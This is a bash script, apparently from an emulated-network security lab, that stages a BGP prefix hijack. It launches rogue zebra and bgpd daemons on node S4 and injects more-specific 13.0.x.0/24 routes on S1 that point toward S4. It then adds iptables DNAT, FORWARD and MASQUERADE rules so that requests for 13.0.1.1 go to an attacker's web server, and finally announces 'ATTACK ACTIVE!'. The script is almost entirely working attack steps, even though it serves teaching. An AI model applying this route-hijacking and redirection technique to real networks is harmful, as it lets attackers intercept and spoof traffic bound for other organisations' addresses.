#!/bin/bash

echo "Killing any existing rogue AS"
./stop_rogue.sh
sleep 1

echo "Starting rogue AS daemons..."
# Run both daemons in parallel
sudo python3 run.py --node S4 --cmd "sudo /usr/sbin/zebra -f conf/zebra-S4.conf -d -i /tmp/zebra-S4.pid > logs/S4-zebra-stdout 2>&1" &
PID1=$!
sudo python3 run.py --node S4 --cmd "sudo /usr/sbin/bgpd -f conf/bgpd-S4.conf -d -i /tmp/bgpd-S4.pid > logs/S4-bgpd-stdout 2>&1" &
PID2=$!
wait $PID1 $PID2

echo "Daemons started. Waiting for BGP neighbor establishment (10 seconds)..."
sleep 10

echo ""
echo "Adding S4's hijacked routes to S1 (overriding with more specific prefix)..."
# Add the more specific hijacked routes that S4 announces
# This simulates BGP route installation since Quagga's socket communication is broken
sudo python3 run.py --node S1 --cmd "ip route del 13.0.0.0/8 via 9.0.0.2 2>/dev/null; true"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.1.0/24 via 9.0.4.2"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.2.0/24 via 9.0.4.2"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.3.0/24 via 9.0.4.2"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.0.0/8 via 9.0.0.2"

echo "Waiting for routes to settle (2 seconds)..."
sleep 2

echo ""
echo "Verifying routes on S1..."
sudo python3 run.py --node S1 --cmd "ip route show | grep 13.0"

echo ""
echo "Setting up traffic redirection on S4..."
# Enable IP forwarding
sudo python3 run.py --node S4 --cmd "sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1"

# Add DNAT rule to redirect traffic destined for 13.0.1.1 to the attacker's webserver (14.0.1.1)
sudo python3 run.py --node S4 --cmd "iptables -t nat -A PREROUTING -d 13.0.1.1 -j DNAT --to-destination 14.0.1.1 2>/dev/null; true"
sudo python3 run.py --node S4 --cmd "iptables -A FORWARD -d 14.0.1.0/24 -j ACCEPT 2>/dev/null; true"
sudo python3 run.py --node S4 --cmd "iptables -t nat -A POSTROUTING -s 14.0.1.0/24 -j MASQUERADE 2>/dev/null; true"

echo ""
echo "=========================================="
echo "ATTACK ACTIVE!"
echo "S4 is now hijacking 13.0.1.0/24 traffic"
echo "Requests to 13.0.1.1 redirected to 14.0.1.1"
echo "=========================================="
